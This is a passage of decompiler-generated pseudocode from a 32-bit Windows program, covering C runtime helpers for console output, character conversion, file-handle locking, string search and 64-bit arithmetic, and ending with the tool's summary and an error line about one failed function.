// 429E00: using guessed type int dword_429E00[];

//----- (00417B4A) --------------------------------------------------------
int __cdecl sub_417B4A(int a1)
{
  int result; // eax

  result = *(_DWORD *)(a1 + 12);
  if ( (result & 0x83) != 0 && (result & 8) != 0 )
  {
    sub_4139A3(*(LPVOID *)(a1 + 8));
    *(_DWORD *)(a1 + 12) &= 0xFFFFFBF7;
    result = 0;
    *(_DWORD *)a1 = 0;
    *(_DWORD *)(a1 + 8) = 0;
    *(_DWORD *)(a1 + 4) = 0;
  }
  return result;
}

//----- (00417B7B) --------------------------------------------------------
__int16 __cdecl sub_417B7B(__int16 Buffer)
{
  DWORD v1; // ecx
  DWORD NumberOfCharsWritten; // [esp+0h] [ebp-4h] BYREF

  NumberOfCharsWritten = v1;
  if ( hObject == (HANDLE)-2 )
    sub_418060();
  if ( hObject == (HANDLE)-1 || !WriteConsoleW(hObject, &Buffer, 1u, &NumberOfCharsWritten, 0) )
    return -1;
  else
    return Buffer;
}
// 417B80: variable 'v1' is possibly undefined

//----- (00417BBD) --------------------------------------------------------
int __usercall sub_417BBD@<eax>(int a1@<edi>, LPWSTR lpWideCharStr, LPCCH lpMultiByteStr, unsigned int a4, _DWORD *a5)
{
  int result; // eax
  int v6; // eax
  int v7; // ecx
  bool v8; // zf
  int v9[2]; // [esp+8h] [ebp-10h] BYREF
  int v10; // [esp+10h] [ebp-8h]
  char v11; // [esp+14h] [ebp-4h]

  if ( !lpMultiByteStr || !a4 )
    return 0;
  if ( !*lpMultiByteStr )
  {
    if ( lpWideCharStr )
      *lpWideCharStr = 0;
    return 0;
  }
  sub_413C17((int)v9, a1, a5);
  if ( !*(_DWORD *)(v9[0] + 20) )
  {
    if ( lpWideCharStr )
      *lpWideCharStr = *(unsigned __int8 *)lpMultiByteStr;
    goto LABEL_11;
  }
  if ( sub_41519B(a1, *lpMultiByteStr, v9) )
  {
    v6 = v9[0];
    v7 = *(_DWORD *)(v9[0] + 172);
    if ( v7 > 1
      && (int)a4 >= v7
      && (v8 = MultiByteToWideChar(*(_DWORD *)(v9[0] + 4), 9u, lpMultiByteStr, v7, lpWideCharStr, lpWideCharStr != 0) == 0,
          v6 = v9[0],
          !v8)
      || a4 >= *(_DWORD *)(v6 + 172) && lpMultiByteStr[1] )
    {
      result = *(_DWORD *)(v6 + 172);
      if ( v11 )
        *(_DWORD *)(v10 + 112) &= ~2u;
      return result;
    }
  }
  else if ( MultiByteToWideChar(*(_DWORD *)(v9[0] + 4), 9u, lpMultiByteStr, 1, lpWideCharStr, lpWideCharStr != 0) )
  {
LABEL_11:
    if ( v11 )
      *(_DWORD *)(v10 + 112) &= ~2u;
    return 1;
  }
  *sub_413A1F() = 42;
  if ( v11 )
    *(_DWORD *)(v10 + 112) &= ~2u;
  return -1;
}

//----- (00417CD3) --------------------------------------------------------
int __usercall sub_417CD3@<eax>(int a1@<edi>, LPWSTR lpWideCharStr, LPCCH lpMultiByteStr, int a4)
{
  return sub_417BBD(a1, lpWideCharStr, lpMultiByteStr, a4, 0);
}

//----- (00417D1B) --------------------------------------------------------
int __cdecl sub_417D1B(int a1)
{
  int *v1; // edi
  int v2; // esi

  if ( a1 < 0
    || a1 >= (unsigned int)dword_429DF8
    || (v1 = &dword_429E00[a1 >> 5], v2 = (a1 & 0x1F) << 6, (*(_BYTE *)(*v1 + v2 + 4) & 1) == 0)
    || *(_DWORD *)(*v1 + ((a1 & 0x1F) << 6)) == -1 )
  {
    *sub_413A1F() = 9;
    *sub_413A32() = 0;
    return -1;
  }
  else
  {
    if ( dword_423D80 == 1 )
    {
      if ( a1 )
      {
        if ( a1 == 1 )
        {
          SetStdHandle(0xFFFFFFF5, 0);
        }
        else if ( a1 == 2 )
        {
          SetStdHandle(0xFFFFFFF4, 0);
        }
      }
      else
      {
        SetStdHandle(0xFFFFFFF6, 0);
      }
    }
    *(_DWORD *)(v2 + *v1) = -1;
    return 0;
  }
}
// 423D80: using guessed type int dword_423D80;
// 429DF8: using guessed type int dword_429DF8;
// 429E00: using guessed type int dword_429E00[];

//----- (00417DA1) --------------------------------------------------------
int __usercall sub_417DA1@<eax>(int a1@<edi>, int a2)
{
  int v3; // ecx
  int v4; // eax

  if ( a2 == -2 )
  {
    *sub_413A32() = 0;
    *sub_413A1F() = 9;
    return -1;
  }
  if ( a2 < 0
    || a2 >= (unsigned int)dword_429DF8
    || (v3 = dword_429E00[a2 >> 5], v4 = (a2 & 0x1F) << 6, (*(_BYTE *)(v4 + v3 + 4) & 1) == 0) )
  {
    *sub_413A32() = 0;
    *sub_413A1F() = 9;
    sub_413993(a1);
    return -1;
  }
  return *(_DWORD *)(v4 + v3);
}
// 429DF8: using guessed type int dword_429DF8;
// 429E00: using guessed type int dword_429E00[];

//----- (00417E0A) --------------------------------------------------------
BOOL __cdecl sub_417E0A(int a1)
{
  int v1; // esi
  BOOL v3; // [esp+10h] [ebp-1Ch]

  v1 = dword_429E00[a1 >> 5] + ((a1 & 0x1F) << 6);
  v3 = 1;
  if ( !*(_DWORD *)(v1 + 8) )
  {
    sub_4144A0(a1, 10);
    if ( !*(_DWORD *)(v1 + 8) )
    {
      v3 = InitializeCriticalSectionAndSpinCount((LPCRITICAL_SECTION)(v1 + 12), 0xFA0u);
      ++*(_DWORD *)(v1 + 8);
    }
    sub_4143C7(10);
  }
  if ( v3 )
    EnterCriticalSection((LPCRITICAL_SECTION)(dword_429E00[a1 >> 5] + ((a1 & 0x1F) << 6) + 12));
  return v3;
}
// 429E00: using guessed type int dword_429E00[];

//----- (00417EA9) --------------------------------------------------------
void __cdecl sub_417EA9(int a1)
{
  LeaveCriticalSection((LPCRITICAL_SECTION)(dword_429E00[a1 >> 5] + ((a1 & 0x1F) << 6) + 12));
}
// 429E00: using guessed type int dword_429E00[];

//----- (00418060) --------------------------------------------------------
HANDLE sub_418060()
{
  HANDLE result; // eax

  result = CreateFileW(L"CONOUT$", 0x40000000u, 3u, 0, 3u, 0, 0);
  hObject = result;
  return result;
}

//----- (0041807F) --------------------------------------------------------
HANDLE sub_41807F()
{
  HANDLE result; // eax

  result = hObject;
  if ( hObject != (HANDLE)-1 && hObject != (HANDLE)-2 )
    return (HANDLE)CloseHandle(hObject);
  return result;
}

//----- (004180E0) --------------------------------------------------------
char *__cdecl sub_4180E0(char *a1, unsigned __int8 *a2)
{
  int v2; // ebx
  int v3; // eax
  char *v4; // edx
  char v5; // cl
  int v6; // ebx
  int v7; // ecx
  int v8; // esi
  int v9; // eax
  unsigned int v10; // eax
  unsigned int v11; // eax
  unsigned int v12; // eax
  unsigned __int8 v13; // dl
  char *v14; // edi
  unsigned __int8 v15; // dh
  unsigned __int8 *v16; // ecx
  char *v17; // esi
  char v18; // al
  unsigned __int8 v20; // ah
  char v21; // al
  unsigned __int8 v22; // al

  v13 = *a2;
  v14 = a1;
  if ( !*a2 )
    return a1;
  v15 = a2[1];
  if ( v15 )
  {
LABEL_3:
    v16 = a2;
    v17 = v14 + 1;
    if ( *v14 == v13 )
      goto LABEL_9;
    if ( *v14 )
    {
      while ( 2 )
      {
        v18 = *v17++;
        while ( v18 == v13 )
        {
LABEL_9:
          v18 = *v17++;
          if ( v18 == v15 )
          {
            v14 = v17 - 1;
            while ( 1 )
            {
              v20 = v16[2];
              if ( !v20 )
                break;
              v21 = *v17;
              v17 += 2;
              if ( v21 != v20 )
                goto LABEL_3;
              v22 = v16[3];
              if ( !v22 )
                break;
              v16 += 2;
              if ( v22 != *(v17 - 1) )
                goto LABEL_3;
            }
            return v14 - 1;
          }
        }
        if ( v18 )
          continue;
        break;
      }
    }
    return 0;
  }
  else
  {
    v2 = v13;
    v3 = v13 << 8;
    v4 = a1;
    if ( ((unsigned __int8)a1 & 3) != 0 )
    {
      while ( 1 )
      {
        v5 = *v4++;
        if ( v5 == (_BYTE)v2 )
          return v4 - 1;
        if ( !v5 )
          return 0;
        if ( ((unsigned __int8)v4 & 3) == 0 )
          goto LABEL_24;
      }
    }
    else
    {
LABEL_24:
      v6 = v3 | v2 | ((v3 | v2) << 16);
      while ( 1 )
      {
        while ( 1 )
        {
          v7 = v6 ^ *(_DWORD *)v4;
          v8 = *(_DWORD *)v4 + 2130640639;
          v9 = v8 ^ ~*(_DWORD *)v4;
          v4 += 4;
          if ( (((v7 + 2130640639) ^ ~v7) & 0x81010100) != 0 )
            break;
          v10 = v9 & 0x81010100;
          if ( v10 && ((v10 & 0x1010100) != 0 || (v8 & 0x80000000) == 0) )
            return 0;
        }
        v11 = *((_DWORD *)v4 - 1);
        if ( (_BYTE)v11 == (_BYTE)v6 )
          break;
        if ( !(_BYTE)v11 )
          return 0;
        if ( BYTE1(v11) == (_BYTE)v6 )
          return v4 - 3;
        if ( !BYTE1(v11) )
          return 0;
        v12 = HIWORD(v11);
        if ( (_BYTE)v12 == (_BYTE)v6 )
          return v4 - 2;
        if ( !(_BYTE)v12 )
          return 0;
        if ( BYTE1(v12) == (_BYTE)v6 )
          return v4 - 1;
        if ( !BYTE1(v12) )
          return 0;
      }
      return v4 - 4;
    }
  }
}

//----- (004184E0) --------------------------------------------------------
int __stdcall sub_4184E0(unsigned __int64 a1, __int64 a2)
{
  int v2; // edi
  int v3; // eax
  unsigned __int64 v4; // rtt
  __int64 v5; // rax
  unsigned __int64 v6; // rcx
  unsigned __int64 v7; // rax
  unsigned int v8; // esi
  unsigned __int64 v9; // rax

  v2 = 0;
  if ( (a1 & 0x8000000000000000ui64) != 0i64 )
  {
    v2 = 1;
    HIDWORD(a1) = -HIDWORD(a1) - ((_DWORD)a1 != 0);
    LODWORD(a1) = -(int)a1;
  }
  v3 = HIDWORD(a2);
  if ( a2 < 0 )
  {
    ++v2;
    v3 = -HIDWORD(a2) - ((_DWORD)a2 != 0);
    HIDWORD(a2) = v3;
    LODWORD(a2) = -(int)a2;
  }
  if ( v3 )
  {
    v6 = __PAIR64__(v3, a2);
    v7 = a1;
    do
    {
      v6 >>= 1;
      v7 >>= 1;
    }
    while ( HIDWORD(v6) );
    v8 = v7 / (unsigned int)v6;
    v9 = v8 * (unsigned __int64)(unsigned int)a2;
    if ( __CFADD__(HIDWORD(a2) * v8, HIDWORD(v9)) || (HIDWORD(v9) = (a2 * (unsigned __int64)v8) >> 32, v9 > a1) )
      --v8;
    v5 = v8;
  }
  else
  {
    LODWORD(v4) = a1;
    HIDWORD(v4) = HIDWORD(a1) % (unsigned int)a2;
    LODWORD(v5) = v4 / (unsigned int)a2;
    HIDWORD(v5) = HIDWORD(a1) / (unsigned int)a2;
  }
  if ( v2 == 1 )
    return -v5;
  return v5;
}

//----- (00418590) --------------------------------------------------------
unsigned int __stdcall sub_418590(unsigned __int64 a1, __int64 a2)
{
  unsigned __int64 v3; // rtt
  unsigned int v4; // ecx
  unsigned int v5; // ebx
  unsigned __int64 v6; // rax
  char v7; // cf
  unsigned int v8; // esi
  unsigned __int64 v9; // rax

  if ( HIDWORD(a2) )
  {
    v4 = HIDWORD(a2);
    v5 = a2;
    v6 = a1;
    do
    {
      v7 = v4 & 1;
      v4 >>= 1;
      v5 = (v5 >> 1) | (v7 << 31);
      v6 >>= 1;
    }
    while ( v4 );
    v8 = v6 / v5;
    v9 = v8 * (unsigned __int64)(unsigned int)a2;
    if ( __CFADD__(HIDWORD(a2) * v8, HIDWORD(v9)) || (HIDWORD(v9) = (a2 * (unsigned __int64)v8) >> 32, v9 > a1) )
      --v8;
    return v8;
  }
  else
  {
    LODWORD(v3) = a1;
    HIDWORD(v3) = HIDWORD(a1) % (unsigned int)a2;
    return v3 / (unsigned int)a2;
  }
}

//----- (00418600) --------------------------------------------------------
unsigned __int64 __usercall sub_418600@<edx:eax>(unsigned __int64 a1@<edx:eax>, unsigned __int8 a2@<cl>)
{
  if ( a2 >= 0x40u )
    return 0i64;
  else
    return a1 >> a2;
}

//----- (00418620) --------------------------------------------------------
unsigned __int64 __stdcall sub_418620(unsigned __int64 a1, __int64 a2)
{
  int v2; // edi
  int v3; // eax
  unsigned __int64 v4; // rtt
  unsigned __int64 result; // rax
  unsigned __int64 v6; // rcx
  unsigned __int64 v7; // rax
  unsigned int v8; // eax
  int v9; // ecx
  bool v10; // cf
  unsigned __int64 v11; // rax

  v2 = 0;
  if ( (a1 & 0x8000000000000000ui64) != 0i64 )
  {
    v2 = 1;
    HIDWORD(a1) = -HIDWORD(a1) - ((_DWORD)a1 != 0);
    LODWORD(a1) = -(int)a1;
  }
  v3 = HIDWORD(a2);
  if ( a2 < 0 )
  {
    v3 = -HIDWORD(a2) - ((_DWORD)a2 != 0);
    HIDWORD(a2) = v3;
    LODWORD(a2) = -(int)a2;
  }
  if ( !v3 )
  {
    LODWORD(v4) = a1;
    HIDWORD(v4) = HIDWORD(a1) % (unsigned int)a2;
    result = v4 % (unsigned int)a2;
    if ( v2 - 1 < 0 )
      return result;
    return -(__int64)result;
  }
  v6 = __PAIR64__(v3, a2);
  v7 = a1;
  do
  {
    v6 >>= 1;
    v7 >>= 1;
  }
  while ( HIDWORD(v6) );
  v8 = v7 / (unsigned int)v6;
  v9 = HIDWORD(a2) * v8;
  v11 = (unsigned int)a2 * (unsigned __int64)v8;
  v10 = __CFADD__(v9, HIDWORD(v11));
  HIDWORD(v11) += v9;
  if ( v10 || v11 > a1 )
    v11 -= a2;
  result = v11 - a1;
  if ( v2 - 1 < 0 )
    return -(__int64)result;
  return result;
}

// nfuncs=303 queued=297 decompiled=297 lumina nreq=0 worse=0 better=0
#error "There were 1 decompilation failure(s) on 297 function(s)"
